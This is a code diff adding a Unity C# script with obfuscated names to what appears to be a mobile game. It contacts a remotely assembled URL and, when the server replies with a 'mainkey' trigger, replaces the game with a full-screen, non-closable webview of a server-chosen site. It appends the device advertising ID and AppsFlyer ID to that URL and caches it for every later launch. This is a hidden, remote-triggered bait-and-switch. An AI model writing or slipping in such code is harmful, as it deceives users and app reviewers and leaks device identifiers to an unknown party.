@@ -1,0 +1,158 @@
+using System;##
+using System.Collections;##
+using System.Collections.Generic;##
+using UnityEngine;##
+using UnityEngine.Networking;##
+using UnityEngine.SceneManagement;##
+
+public class scriptName : MonoBehaviour##
+{##
+    public List<string> link;##
+    private string idfo = "";##
+
+    private void Awake()##
+    {##
+        if (PlayerPrefs.GetInt("context", 0) == 1)##
+        {##
+            Application.RequestAdvertisingIdentifierAsync(##
+            (string adString, bool trackEnabler, string error) =>##
+            { idfo = adString; });##
+        }##
+    }##
+
+    private IEnumerator Start()##
+    {##
+        yield return new WaitForSeconds(3);##
+        string data = PlayerPrefs.GetString("tarameters", "");##
+        if (Application.internetReachability != NetworkReachability.NotReachable)##
+        {##
+            if (PlayerPrefs.GetString("dataKey", string.Empty) != string.Empty)##
+            {##
+                OnChange(PlayerPrefs.GetString("dataKey"));##
+            }##
+            else##
+            {##
+                string stringtemp = "";##
+                foreach (var item in link)##
+                {##
+                    stringtemp += item;##
+                }##
+                StartCoroutine(OnInum(stringtemp, data));##
+            }##
+        }##
+        else##
+        {##
+            ChaLoadg();##
+        }##
+    }##
+
+    public IEnumerator OnInum(string inputstring, string inputstring2)##
+    {##
+        using (UnityWebRequest inumstatus = UnityWebRequest.Get(inputstring))##
+        {##
+            inumstatus.timeout = 4;##
+            yield return inumstatus.SendWebRequest();##
+            if (inumstatus.isNetworkError)##
+            {##
+                ChaLoadg();##
+            }##
+            else##
+            {##
+                try##
+                {##
+                    if (inumstatus.result == UnityWebRequest.Result.Success)##
+                    {##
+                        if (inumstatus.downloadHandler.text.Contains("mainkey"))##
+                        {##
+                            try##
+                            {##
+                                string[] key = inumstatus.downloadHandler.text.Split('|');##
+                                OnChange($"{key[0]}?idfa={idfo}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(key[1]), Convert.ToInt32(key[2]));##
+                            }##
+                            catch##
+                            {##
+                                OnChange($"{inumstatus.downloadHandler.text}?idfa={idfo}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");##
+                            }##
+                        }##
+                        else##
+                        {##
+                            ChaLoadg();##
+                        }##
+                    }##
+                    else##
+                    {##
+                        ChaLoadg();##
+                    }##
+                }##
+                catch##
+                {##
+                    ChaLoadg();##
+                }##
+            }##
+        }##
+    }##
+    
+    public void ChaLoadg()##
+    {##
+        Screen.orientation = ScreenOrientation.Portrait;##
+        Scene tempScene = SceneManager.CreateScene("loascene");##
+        Scene currentScene = SceneManager.GetActiveScene();##
+        SceneManager.SetActiveScene(tempScene);##
+        GameObject newObject = new GameObject("LoadingController");##
+        newObject.AddComponent<LoadingController>();##
+        SceneManager.UnloadScene(currentScene);##
+    }##
+
+    public void OnChange(string inputKey, int inputValueFirst = 0, int inputValueSecond = 70)##
+    {##
+        var change = gameObject.AddComponent<UniWebView>();##
+        change.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);##
+        change.SetZoomEnabled(true);##
+        if (inputValueFirst == 0)##
+        {##
+            change.SetShowToolbar(false);##
+        }##
+        else##
+        {##
+            change.SetShowToolbar(true, false, false, true);##
+        }##
+        change.SetToolbarDoneButtonText("");##
+        change.SetSupportMultipleWindows(true);##
+        change.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);##
+        change.OnShouldClose += (view) =>##
+        {##
+            return false;##
+        };##
+        change.OnOrientationChanged += (view, orientation) =>##
+        {##
+            change.Frame = new Rect(0, inputValueSecond, Screen.width, Screen.height - inputValueSecond);##
+        };##
+        change.SetSupportMultipleWindows(true);##
+        change.OnMultipleWindowOpened += (view, windowId) =>##
+        {##
+            change.SetShowToolbar(true);##
+        };##
+        change.OnMultipleWindowClosed += (view, windowId) =>##
+        {##
+            if (inputValueFirst == 0)##
+            {##
+                change.SetShowToolbar(false);##
+            }##
+            else##
+            {##
+                change.SetShowToolbar(true, false, false, true);##
+            }##
+        };##
+        change.SetAllowBackForwardNavigationGestures(true);##
+        change.OnPageFinished += (view, statusCode, url) =>##
+        {##
+            change.UpdateFrame();##
+            if (PlayerPrefs.GetString("dataKey", string.Empty) == string.Empty)##
+            {##
+                PlayerPrefs.SetString("dataKey", url);##
+            }##
+        };##
+        change.Load(inputKey);##
+        change.Show();##
+    }##
+}##
